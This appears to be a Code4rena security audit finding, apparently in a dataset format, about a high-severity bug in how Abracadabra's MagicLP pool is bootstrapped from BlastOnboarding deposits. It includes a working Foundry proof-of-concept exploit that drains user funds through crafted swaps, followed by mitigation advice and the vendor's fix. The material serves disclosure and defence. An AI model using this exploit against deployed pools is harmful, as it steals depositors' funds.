{
  "Title": "[H-03] Users who deposited MIM and USDB tokens into BlastOnboarding may incur losses when the pool is created via bootstrap",
  "Content": "\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L104-L106>\n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboardingBoot.sol#L101-L106> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L68-L70> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L381-L383> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L381-L383> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L171> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/libraries/PMMPricing.sol#L194-L199> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/libraries/PMMPricing.sol#L59-L63>\n\nUsers can deposit `MIM` and `USDB` tokens into `BlastOnboarding`.\nOnce `locked`, these tokens cannot be `unlocked`.\nThe `locked` tokens will be utilized to establish a `MagicLP MIM/USDB pool` through `bootstrap`.\nAlthough the prices of `MIM` and `USDB` tokens are nearly identical, there is no assurance regarding the `locked` amounts of `MIM` and `USDB` tokens.\nSignificant differences between the `locked` amounts may exist.\nDepending on this difference, the `K` value, and the chosen funds by the attacker, substantial `funds` can be stolen.\n\nThe vulnerability stems from the `createPool` function in the `Router`.\nConsequently, any user who creates a `MagicLP pool` using this function is susceptible to `fund` loss.\n\n### Proof of Concept\n\nUsers can deposit and `lock` `MIM` and `USDB` tokens into `BlastOnboarding`.\n\n    function deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        if (lock_) {\n            totals[token].locked += amount;\n            balances[msg.sender][token].locked += amount;\n        }\n    }\n\nThese tokens cannot be `unlocked`.\nThey will be used to create a `MagicLP MIM/USDB pool` during `bootstrap`.\n\n    function bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {\n        uint256 baseAmount = totals[MIM].locked;\n        uint256 quoteAmount = totals[USDB].locked;\n        MIM.safeApprove(address(router), type(uint256).max);\n        USDB.safeApprove(address(router), type(uint256).max);\n\n        (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);\n    }\n\nAll `locked` tokens are utilized; there is no way to use only a portion of them.\nAdditionally, there is no assurance that the `locked` amounts of `MIM` and `USDB` will be identical.\n\nJust check the `comment` below, which originates from the `testBoot` function in the `protocol`.\nIt indicates a variance between the `locked` amounts.\nIn actual scenarios, this difference can be substantial.\n\n    mimBalanceLp  2,119,631.389084817485854616\n    usdbBalanceLp 2,304,028.663685524363161291\n\nThe problem arises from creating a `pool` using the `createPool` function in the `router`.\nAny user who creates a `pool` via this function risks losing their funds.\n\nWhen creating a `MagicLP` using this function, we send all tokens to the `Pool` and purchase `shares`.\n\n    function createPool()  external returns (address clone, uint256 shares) {\n        baseToken.safeTransferFrom(msg.sender, clone, baseInAmount);\n        quoteToken.safeTransferFrom(msg.sender, clone, quoteInAmount);\n        (shares, , ) = IMagicLP(clone).buyShares(to);\n    }\n\nIn the `buyShares` function, we also take into account the `price` of both tokens.\nWe calculate the `shares` as the minimum of `base` and `quote` tokens and update the `targets` accordingly.\nThis implies that the `target` of one token can be lower than its `reserve`.\n\n    function buyShares(address to) external nonReentrant returns (uint256 shares, uint256 baseInput, uint256 quoteInput) {\n        if (totalSupply() == 0) {\n            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) ? DecimalMath.divFloor(quoteBalance, _I_) : baseBalance;\n            _BASE_TARGET_ = shares.toUint112();\n            _QUOTE_TARGET_ = DecimalMath.mulFloor(shares, _I_).toUint112();\n        }\n    }\n\nWe might believe that this only affects the initial `shares` value and poses no vulnerability.\nHowever, in reality, it provides an opportunity for a malicious user to steal `funds`.\n\n**Attack Scenario**\n\n1.  The initial user (`BlastOnboarding` in our case) creates a `pool` with `1000` `MIM` and `3000` `USDB`.\n\n2.  Afterward, the `reserve` and `targets` for the `base` and `quote` tokens will be as follows:\n\n```\n\n    base reserve    ==>   1,000.000000000000000000\n    base target     ==>   1,000.000000000000000000\n    quote reserve   ==>   3,000.000000000000000000\n    quote target    ==>   1,000.000000000000000000\n```\n\nAs you can see, the `target` of the `quote` token is lower than its `reserve`.\n\n3.  The attacker sells `1000 USDB`, causing the `state` to transition to `ABOVE_ONE` because the `base reserve` becomes lower than the `target`.\n\n```\n\n    **** After selling the Quote token ****\n    base reserve    ==>   21.969428421231012680\n    base target     ==>   1,000.000000000000000000\n    quote reserve   ==>   4,000.000000000000000000\n    quote target    ==>   1,000.000000000000000000\n```\n\n4.  Before selling base tokens, we calculate the internal base target.\n\n```\n\n    function querySellBase(\n        address trader,\n        uint256 payBaseAmount\n    ) public view returns (uint256 receiveQuoteAmount, uint256 mtFee, \n        PMMPricing.RState newRState, uint256 newBaseTarget) {\n            PMMPricing.PMMState memory state = getPMMState();\n    }\n```\n\n5.  The `quote reserve` significantly exceeds its `target`, causing the internal `base target` to potentially become large.\n\nThis occurs because the current state is `ABOVE_ONE`, and we anticipate reaching the `base target` by selling all excess `quote` tokens (`reserve - target`).\n\n     function adjustedTarget(PMMState memory state) internal pure {\n        if (state.R == RState.BELOW_ONE) {\n            state.Q0 = Math._SolveQuadraticFunctionForTarget(state.Q, state.B - state.B0, state.i, state.K);\n        } else if (state.R == RState.ABOVE_ONE) {\n            state.B0 = Math._SolveQuadraticFunctionForTarget(\n                state.B,\n                state.Q - state.Q0,\n                DecimalMath.reciprocalFloor(state.i),\n                state.K\n            );\n        }\n    }\n\nWe can check this value in the below comment\n\n    **** Prior to selling the Base token ****\n    changed base target   ==>   2841093923465485694661\n\n6.  Furthermore, in this state, the price of the `base token` is higher than the normal price, implying that we can sell a considerable amount of `base` tokens at a higher price.\n\n```\n\n    function sellBaseToken(PMMState memory state, uint256 payBaseAmount) internal pure returns (uint256 receiveQuoteAmount, RState newR) {\n        if (state.R == RState.ONE) {\n        } else if (state.R == RState.ABOVE_ONE) {\n            uint256 backToOnePayBase = state.B0 - state.B;\n            uint256 backToOneReceiveQuote = state.Q - state.Q0;\n            if (payBaseAmount < backToOnePayBase) {\n                    \n            } else if (payBaseAmount == backToOnePayBase) {\n                receiveQuoteAmount = backToOneReceiveQuote;\n                newR = RState.ONE;\n            }\n        }\n    }\n```\n\nWe can sell `state.B0 - state.B (2841 - 21)` `base` tokens for `state.Q - state.Q0 (4000 - 1000)` `quote` tokens.\n\nThe net benefit for an attacker is `158 MIM` from the initial `1000 MIM` tokens.\nThis represents the `loss` of users.\n\n    Benefits for Bob  ==>   158.606076534514305339\n    Loss of protocol  ==>   158.606076534514305339\n\nPlease add below test into `MIMSwap.t.sol`.\nI used `WETH` instead of `USDB` for testing purposes and assumed that the price of both tokens is the same.\n\n<details>\n\n    import {PMMPricing} from \"/mimswap/libraries/PMMPricing.sol\";\n\n    function testBenefitFromBoot() public {\n            uint256 mimLocked = 1000 ether;\n            uint256 usdbLocked = 3000 ether;\n            mim.mint(address(alice), mimLocked);\n            deal(address(weth), address(alice), usdbLocked);\n\n            vm.startPrank(alice);\n            mim.approve(address(router), mimLocked);\n            weth.approve(address(router), usdbLocked);\n            /**\n             * uint256 baseAmount = totals[MIM].locked;\n             * uint256 quoteAmount = totals[USDB].locked;\n             * (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);\n             */\n            (address pool, ) = router.createPool(address(mim), address(weth), MIN_LP_FEE_RATE, 1 ether, 500000000000000, address(alice), mimLocked, usdbLocked);\n            MagicLP lp = MagicLP(pool);\n            vm.stopPrank();\n\n            console2.log(\"**** Starting state ****\");\n            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));\n            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));\n            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));\n            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));\n\n            bool isForTesting = true;\n            uint256 wethForBob = 1000 ether;\n\n            if (isForTesting) {            \n                deal(address(weth), address(bob), wethForBob);\n                vm.startPrank(bob);\n                weth.approve(address(router), wethForBob);\n                router.sellQuoteTokensForTokens(address(lp), bob, wethForBob, 0, type(uint256).max);\n                vm.stopPrank();\n            } else {\n                mim.mint(bob, 0.1 ether);\n                deal(address(weth), address(bob), 0.1 ether);\n                vm.startPrank(bob);\n                mim.approve(address(router), 0.1 ether);\n                router.sellBaseTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);\n                weth.approve(address(router), 0.1 ether);\n                router.sellQuoteTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);\n                vm.stopPrank();\n            }\n\n            console2.log(\"**** After selling the Quote token ****\");\n            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));\n            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));\n            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));\n            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));\n\n            if (isForTesting) {\n                PMMPricing.PMMState memory state = lp.getPMMState();\n                console2.log(\"**** Prior to selling the Base token ****\");\n                console2.log(\"changed base target   ==>  \", state.B0);\n                // Bob is going to sell state.B0 - state.B base tokens\n                uint256 mimForSell = state.B0 - state.B;\n\n                mim.mint(address(bob), mimForSell);\n                vm.startPrank(bob);\n                mim.approve(address(router), mimForSell);\n                router.sellBaseTokensForTokens(address(lp), bob, mimForSell, 0, type(uint256).max);\n                vm.stopPrank();\n\n                // Initially, Bob possesses wethForBob USDB and mimForSell MIM tokens\n                console2.log('Benefits for Bob  ==>  ', toolkit.formatDecimals(mim.balanceOf(bob) + weth.balanceOf(bob) - mimForSell - wethForBob));\n                // Users deposited usdbLocked USDB and mimLocked MIM tokens\n                console2.log('Loss of protocol  ==>  ', toolkit.formatDecimals(mimLocked + usdbLocked - mim.balanceOf(address(lp)) - weth.balanceOf(address(lp))));\n            }\n    }\n\n</details>\n\n### Recommended Mitigation Steps\n\nWe should ensure that the `targets` and `reserves` are the same for the first depositor.\nThis can be directly changed in the `buyShares` function.\nAlternatively, we can implement small swaps twice in the `createPool` function.\nYou could verify this in the above test file by setting `isForTesting` to `false`.\n\nAfter performing `2` small swaps, the `targets` and `reserves` become as follows:\n\n    base reserve    ==>   1,000.000009998331296597\n    base target     ==>   1,000.000000000000000000\n    quote reserve   ==>   3,000.000010004999999500\n    quote target    ==>   3,000.000010003331129210\n\n**[0xCalibur (Abracadabra) acknowledged and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/76#issuecomment-2002157426):**\n > We mitigated the issue by pausable the LP when we are bootstrapping and making sure it's all good before launching it. So we bootstrap it and balance it out ourself and once it's in a good state, we enable trading on the pool.\n> \n> We added notion of protocol own pool and MIM/USDB will be one. The others will be community pools.\n> \n> See changes here for the fix:\n> \n> https://github.com/Abracadabra-money/abracadabra-money-contracts/blob/main/src/mimswap/MagicLP.sol\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-03-abracadabra-money",
  "Code": [
    {
      "filename": "src/blast/BlastOnboarding.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.0;\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {BlastYields} from \"/blast/libraries/BlastYields.sol\";\nimport {BlastTokenRegistry} from \"/blast/BlastTokenRegistry.sol\";\nimport {Proxy} from \"openzeppelin-contracts/proxy/Proxy.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\nimport {BlastPoints} from \"/blast/libraries/BlastPoints.sol\";\nimport {Pausable} from \"openzeppelin-contracts/security/Pausable.sol\";\n\ncontract BlastOnboardingData is Owned, Pausable {\n    error ErrZeroAddress();\n    error ErrWrongState();\n    error ErrUnsupportedToken();\n    error ErrNotAllowed();\n\n    enum State {\n        Idle,\n        Opened,\n        Closed\n    }\n\n    struct Balances {\n        uint256 unlocked;\n        uint256 locked;\n        uint256 total;\n    }\n\n    State public state;\n    address public bootstrapper;\n    address public feeTo;\n    BlastTokenRegistry public registry;\n\n    // Global\n    mapping(address token => bool) public supportedTokens;\n    mapping(address token => Balances) public totals;\n    mapping(address token => uint256 cap) public caps;\n\n    // Per-user\n    mapping(address user => mapping(address token => Balances)) public balances;\n\n    modifier onlyState(State _state) {\n        if (state != _state) {\n            revert ErrWrongState();\n        }\n        _;\n    }\n\n    modifier onlySupportedTokens(address token) {\n        if (!supportedTokens[token]) {\n            revert ErrUnsupportedToken();\n        }\n\n        _;\n    }\n\n    constructor() Owned(msg.sender) {\n        BlastYields.configureDefaultClaimables(address(this));\n        BlastPoints.configure();\n    }\n}\n\ncontract BlastOnboarding is BlastOnboardingData, Proxy {\n    using SafeTransferLib for address;\n\n    event LogBootstrapperChanged(address indexed bootstrapper);\n    event LogTokenSupported(address indexed token, bool supported);\n    event LogDeposit(address indexed user, address indexed token, uint256 amount, bool lock);\n    event LogLock(address indexed user, address indexed token, uint256 amount);\n    event LogFeeToChanged(address indexed feeTo);\n    event LogWithdraw(address indexed user, address indexed token, uint256 amount);\n    event LogTokenCapChanged(address indexed token, uint256 cap);\n    event LogStateChange(State state);\n    event LogTokenRescue(address indexed token, address indexed to, uint256 amount);\n\n    error ErrUnsupported();\n    error ErrCapReached();\n\n    receive() external payable override {\n        revert ErrUnsupported();\n    }\n\n    constructor(BlastTokenRegistry registry_, address feeTo_) {\n        if (address(registry_) == address(0)) {\n            revert ErrZeroAddress();\n        }\n\n        if (feeTo_ == address(0)) {\n            revert ErrZeroAddress();\n        }\n\n        registry = registry_;\n        feeTo = feeTo_;\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// PUBLIC\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        if (lock_) {\n            totals[token].locked += amount;\n            balances[msg.sender][token].locked += amount;\n        } else {\n            totals[token].unlocked += amount;\n            balances[msg.sender][token].unlocked += amount;\n        }\n\n        totals[token].total += amount;\n\n        if (caps[token] > 0 && totals[token].total > caps[token]) {\n            revert ErrCapReached();\n        }\n\n        balances[msg.sender][token].total += amount;\n\n        emit LogDeposit(msg.sender, token, amount, lock_);\n    }\n\n    function lock(address token, uint256 amount) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n        balances[msg.sender][token].unlocked -= amount;\n        balances[msg.sender][token].locked += amount;\n        totals[token].unlocked -= amount;\n        totals[token].locked += amount;\n\n        emit LogLock(msg.sender, token, amount);\n    }\n\n    function withdraw(address token, uint256 amount) external whenNotPaused onlySupportedTokens(token) {\n        balances[msg.sender][token].unlocked -= amount;\n        balances[msg.sender][token].total -= amount;\n        totals[token].unlocked -= amount;\n        totals[token].total -= amount;\n\n        token.safeTransfer(msg.sender, amount);\n\n        emit LogWithdraw(msg.sender, token, amount);\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// ADMIN\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function setFeeTo(address feeTo_) external onlyOwner {\n        if (feeTo_ == address(0)) {\n            revert ErrZeroAddress();\n        }\n\n        feeTo = feeTo_;\n        emit LogFeeToChanged(feeTo_);\n    }\n\n    function callBlastPrecompile(bytes calldata data) external onlyOwner {\n        BlastYields.callPrecompile(data);\n    }\n\n    function claimGasYields() external onlyOwner returns (uint256) {\n        return BlastYields.claimMaxGasYields(feeTo);\n    }\n\n    function claimTokenYields(address[] memory tokens) external onlyOwner {\n        for (uint256 i = 0; i < tokens.length; i++) {\n            if (!supportedTokens[tokens[i]]) {\n                revert ErrUnsupportedToken();\n            }\n            if (registry.nativeYieldTokens(tokens[i])) {\n                BlastYields.claimAllTokenYields(tokens[i], feeTo);\n            }\n        }\n    }\n\n    function setTokenSupported(address token, bool supported) external onlyOwner {\n        supportedTokens[token] = supported;\n\n        if (registry.nativeYieldTokens(token)) {\n            BlastYields.enableTokenClaimable(token);\n        }\n\n        emit LogTokenSupported(token, supported);\n    }\n\n    function setCap(address token, uint256 cap) external onlyOwner onlySupportedTokens(token) {\n        caps[token] = cap;\n        emit LogTokenCapChanged(token, cap);\n    }\n\n    function setBootstrapper(address bootstrapper_) external onlyOwner {\n        bootstrapper = bootstrapper_;\n        emit LogBootstrapperChanged(bootstrapper_);\n    }\n\n    function open() external onlyOwner onlyState(State.Idle) {\n        state = State.Opened;\n        emit LogStateChange(State.Opened);\n    }\n\n    function close() external onlyOwner onlyState(State.Opened) {\n        state = State.Closed;\n        emit LogStateChange(State.Closed);\n    }\n\n    function rescue(address token, address to, uint256 amount) external onlyOwner {\n        if (supportedTokens[token]) {\n            revert ErrNotAllowed();\n        }\n\n        token.safeTransfer(to, amount);\n        emit LogTokenRescue(token, to, amount);\n    }\n\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    function unpause() external onlyOwner {\n        _unpause();\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// PROXY IMPLEMENTATION\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function _implementation() internal view override returns (address) {\n        return address(bootstrapper);\n    }\n}"
    },
    {
      "filename": "src/blast/BlastOnboardingBoot.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.0;\n\nimport {BlastOnboarding} from \"/blast/BlastOnboarding.sol\";\nimport {BlastOnboardingData} from \"/blast/BlastOnboarding.sol\";\nimport {Router} from \"/mimswap/periphery/Router.sol\";\nimport {IFeeRateModel} from \"/mimswap/interfaces/IFeeRateModel.sol\";\nimport {IFactory} from \"/mimswap/interfaces/IFactory.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\nimport {DecimalMath} from \"/mimswap/libraries/DecimalMath.sol\";\nimport {LockingMultiRewards} from \"staking/LockingMultiRewards.sol\";\n\naddress constant USDB = 0x4300000000000000000000000000000000000003;\naddress constant MIM = 0x76DA31D7C9CbEAE102aff34D3398bC450c8374c1;\nuint256 constant FEE_RATE = 0.0005 ether; // 0.05%\nuint256 constant K = 0.00025 ether; // 0.00025, 1.25% price fluctuation, similar to A2000 in curve\nuint256 constant I = 0.998 ether; // 1 MIM = 0.998 USDB\nuint256 constant USDB_TO_MIN = 1.002 ether; // 1 USDB = 1.002 MIM\nuint256 constant MIM_TO_MIN = I;\n\n// Add a new data contract each bootstrap upgrade that involves\n// adding new storage variables.\ncontract BlastOnboardingBootDataV1 is BlastOnboardingData {\n    address public pool;\n    Router public router;\n    IFactory public factory;\n    uint256 public totalPoolShares;\n    bool public ready;\n    LockingMultiRewards public staking;\n    mapping(address user => bool claimed) public claimed;\n}\n\n/// @dev Functions are postfixed with the version number to avoid collisions\ncontract BlastOnboardingBoot is BlastOnboardingBootDataV1 {\n    using SafeTransferLib for address;\n\n    event LogReadyChanged(bool ready);\n    event LogClaimed(address indexed user, uint256 shares, bool lock);\n    event LogInitialized(Router indexed router);\n    event LogLiquidityBootstrapped(address indexed pool, address indexed staking, uint256 amountOut);\n    event LogStakingChanged(address indexed staking);\n\n    error ErrInsufficientAmountOut();\n    error ErrNotReady();\n    error ErrAlreadyClaimed();\n    error ErrWrongFeeRateModel();\n    error ErrAlreadyBootstrapped();\n    error ErrNothingToClaim();\n    error ErrCannotChangeOnceReady();\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// PUBLIC\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function claim(bool lock) external returns (uint256 shares) {\n        if (!ready) {\n            revert ErrNotReady();\n        }\n        if (claimed[msg.sender]) {\n            revert ErrAlreadyClaimed();\n        }\n\n        shares = _claimable(msg.sender);\n        if (shares == 0) {\n            revert ErrNothingToClaim();\n        }\n\n        claimed[msg.sender] = true;\n        staking.stakeFor(msg.sender, shares, lock);\n\n        emit LogClaimed(msg.sender, shares, lock);\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// VIEWS\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function claimable(address user) external view returns (uint256 shares) {\n        if (!ready || claimed[user]) {\n            return 0;\n        }\n\n        return _claimable(user);\n    }\n\n    function previewTotalPoolShares() external view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        uint256 baseAmount = totals[MIM].locked;\n        uint256 quoteAmount = totals[USDB].locked;\n        return router.previewCreatePool(I, baseAmount, quoteAmount);\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// ADMIN\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {\n        if (pool != address(0)) {\n            revert ErrAlreadyBootstrapped();\n        }\n\n        uint256 baseAmount = totals[MIM].locked;\n        uint256 quoteAmount = totals[USDB].locked;\n        MIM.safeApprove(address(router), type(uint256).max);\n        USDB.safeApprove(address(router), type(uint256).max);\n\n        (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);\n\n        if (totalPoolShares < minAmountOut) {\n            revert ErrInsufficientAmountOut();\n        }\n\n        // Create staking contract\n        // 3x boosting for locker, 7 days reward duration, 13 weeks lp locking\n        // make this contract temporary the owner the set it as an operator\n        // for permissionned `stakeFor` during the claiming process and then\n        // transfer the ownership to the onboarding owner.\n        staking = new LockingMultiRewards(pool, 30_000, 7 days, 13 weeks, address(this));\n        staking.setOperator(address(this), true);\n        staking.transferOwnership(owner);\n\n        // Approve staking contract\n        pool.safeApprove(address(staking), totalPoolShares);\n\n        emit LogLiquidityBootstrapped(pool, address(staking), totalPoolShares);\n\n        return (pool, address(staking), totalPoolShares);\n    }\n\n    function initialize(Router _router) external onlyOwner {\n        router = Router(payable(_router));\n        factory = IFactory(router.factory());\n        emit LogInitialized(_router);\n    }\n\n    // Just in case we need to change the staking contract after\n    // the automatic bootstrapping process\n    function setStaking(LockingMultiRewards _staking) external onlyOwner {\n        if (ready) {\n            revert ErrCannotChangeOnceReady();\n        }\n\n        staking = _staking;\n        emit LogStakingChanged(address(_staking));\n    }\n\n    function setReady(bool _ready) external onlyOwner onlyState(State.Closed) {\n        ready = _ready;\n        emit LogReadyChanged(ready);\n    }\n\n    //////////////////////////////////////////////////////////////////////////////////////\n    /// INTERNALS\n    //////////////////////////////////////////////////////////////////////////////////////\n\n    function _claimable(address user) internal view returns (uint256 shares) {\n        uint256 totalLocked = totals[MIM].locked + totals[USDB].locked;\n\n        if (totalLocked == 0) {\n            return 0;\n        }\n\n        uint256 userLocked = balances[user][MIM].locked + balances[user][USDB].locked;\n        return (userLocked * totalPoolShares) / totalLocked;\n    }\n}"
    },
    {
      "filename": "src/mimswap/periphery/Router.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.0;\n\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\nimport {IERC20} from \"openzeppelin-contracts/interfaces/IERC20.sol\";\nimport {DecimalMath} from \"/mimswap/libraries/DecimalMath.sol\";\nimport {IWETH} from \"interfaces/IWETH.sol\";\nimport {IMagicLP} from \"/mimswap/interfaces/IMagicLP.sol\";\nimport {IFactory} from \"/mimswap/interfaces/IFactory.sol\";\nimport {IERC20Metadata} from \"openzeppelin-contracts/interfaces/IERC20Metadata.sol\";\n\ncontract Router {\n    using SafeTransferLib for address;\n    using SafeTransferLib for address payable;\n\n    error ErrNotETHLP();\n    error ErrExpired();\n    error ErrZeroAddress();\n    error ErrPathTooLong();\n    error ErrEmptyPath();\n    error ErrBadPath();\n    error ErrTooHighSlippage(uint256 amountOut);\n    error ErrInvalidBaseToken();\n    error ErrInvalidQuoteToken();\n    error ErrInTokenNotETH();\n    error ErrOutTokenNotETH();\n    error ErrInvalidQuoteTarget();\n    error ErrZeroDecimals();\n    error ErrDecimalsDifferenceTooLarge();\n\n    uint256 public constant MAX_BASE_QUOTE_DECIMALS_DIFFERENCE = 12;\n\n    IWETH public immutable weth;\n    IFactory public immutable factory;\n\n    receive() external payable {}\n\n    constructor(IWETH weth_, IFactory factory_) {\n        if (address(weth_) == address(0) || address(factory_) == address(0)) {\n            revert ErrZeroAddress();\n        }\n\n        weth = weth_;\n        factory = factory_;\n    }\n\n    modifier ensureDeadline(uint256 deadline) {\n        if (block.timestamp > deadline) {\n            revert ErrExpired();\n        }\n        _;\n    }\n\n    function createPool(\n        address baseToken,\n        address quoteToken,\n        uint256 lpFeeRate,\n        uint256 i,\n        uint256 k,\n        address to,\n        uint256 baseInAmount,\n        uint256 quoteInAmount\n    ) external returns (address clone, uint256 shares) {\n        _validateDecimals(IERC20Metadata(baseToken).decimals(), IERC20Metadata(quoteToken).decimals());\n\n        clone = IFactory(factory).create(baseToken, quoteToken, lpFeeRate, i, k);\n\n        baseToken.safeTransferFrom(msg.sender, clone, baseInAmount);\n        quoteToken.safeTransferFrom(msg.sender, clone, quoteInAmount);\n        (shares, , ) = IMagicLP(clone).buyShares(to);\n    }\n\n    function createPoolETH(\n        address token,\n        bool useTokenAsQuote,\n        uint256 lpFeeRate,\n        uint256 i,\n        uint256 k,\n        address to,\n        uint256 tokenInAmount\n    ) external payable returns (address clone, uint256 shares) {\n        if (useTokenAsQuote) {\n            _validateDecimals(18, IERC20Metadata(token).decimals());\n        } else {\n            _validateDecimals(IERC20Metadata(token).decimals(), 18);\n        }\n\n        clone = IFactory(factory).create(useTokenAsQuote ? address(weth) : token, useTokenAsQuote ? token : address(weth), lpFeeRate, i, k);\n\n        weth.deposit{value: msg.value}();\n        token.safeTransferFrom(msg.sender, clone, tokenInAmount);\n        address(weth).safeTransferFrom(address(this), clone, msg.value);\n        (shares, , ) = IMagicLP(clone).buyShares(to);\n    }\n\n    function previewCreatePool(\n        uint256 i,\n        uint256 baseInAmount,\n        uint256 quoteInAmount\n    ) external pure returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        shares = quoteInAmount < DecimalMath.mulFloor(baseInAmount, i) ? DecimalMath.divFloor(quoteInAmount, i) : baseInAmount;\n        baseAdjustedInAmount = shares;\n        quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n\n        if (shares <= 2001) {\n            return (0, 0, 0);\n        }\n\n        shares -= 1001;\n    }\n\n    function previewAddLiquidity(\n        address lp,\n        uint256 baseInAmount,\n        uint256 quoteInAmount\n    ) external view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        (uint256 baseReserve, uint256 quoteReserve) = IMagicLP(lp).getReserves();\n\n        uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp)) + baseInAmount;\n        uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp)) + quoteInAmount;\n\n        baseInAmount = baseBalance - baseReserve;\n        quoteInAmount = quoteBalance - quoteReserve;\n\n        if (baseInAmount == 0) {\n            return (0, 0, 0);\n        }\n\n        uint256 totalSupply = IERC20(lp).totalSupply();\n\n        if (totalSupply == 0) {\n            if (quoteBalance == 0) {\n                return (0, 0, 0);\n            }\n\n            uint256 i = IMagicLP(lp)._I_();\n\n            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, i) ? DecimalMath.divFloor(quoteBalance, i) : baseBalance;\n            baseAdjustedInAmount = shares;\n            quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n\n            if (shares <= 2001) {\n                return (0, 0, 0);\n            }\n\n            shares -= 1001;\n        } else if (baseReserve > 0 && quoteReserve > 0) {\n            uint256 baseInputRatio = DecimalMath.divFloor(baseInAmount, baseReserve);\n            uint256 quoteInputRatio = DecimalMath.divFloor(quoteInAmount, quoteReserve);\n            if (baseInputRatio <= quoteInputRatio) {\n                baseAdjustedInAmount = baseInAmount;\n                quoteAdjustedInAmount = DecimalMath.mulCeil(quoteReserve, baseInputRatio);\n                shares = DecimalMath.mulFloor(totalSupply, baseInputRatio);\n            } else {\n                quoteAdjustedInAmount = quoteInAmount;\n                baseAdjustedInAmount = DecimalMath.mulCeil(baseReserve, quoteInputRatio);\n                shares = DecimalMath.mulFloor(totalSupply, quoteInputRatio);\n            }\n        }\n    }\n\n    function addLiquidity(\n        address lp,\n        address to,\n        uint256 baseInAmount,\n        uint256 quoteInAmount,\n        uint256 minimumShares,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        (baseAdjustedInAmount, quoteAdjustedInAmount) = _adjustAddLiquidity(lp, baseInAmount, quoteInAmount);\n\n        IMagicLP(lp)._BASE_TOKEN_().safeTransferFrom(msg.sender, lp, baseAdjustedInAmount);\n        